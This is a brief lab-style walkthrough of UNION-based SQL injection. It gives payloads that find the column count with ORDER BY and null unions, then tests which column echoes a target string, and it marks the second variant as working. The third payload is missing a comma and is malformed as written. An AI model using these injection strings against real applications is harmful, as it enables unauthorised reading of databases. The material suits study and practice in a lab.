#Step 1:  First of all find the number of columns using any of these methods:-

1. ' order by 1--
2. ' union select null,null,null --

#Step 2:   We have to print the random string given 'lXZy5s'.

Union rules says:-

a. Every SELECT should have same number of columns.
b. Columns must have similar data types.
c. Columns in every SELECT should be in same order.

# So, we have to try every possible order to print the random string.

1. ' union select 'lXZy5s',null,null--
2. ' union select null,'lXZy5s',null--	[BOOM!!! This order is working.]
3. ' union select null,null'lXZy5s'--
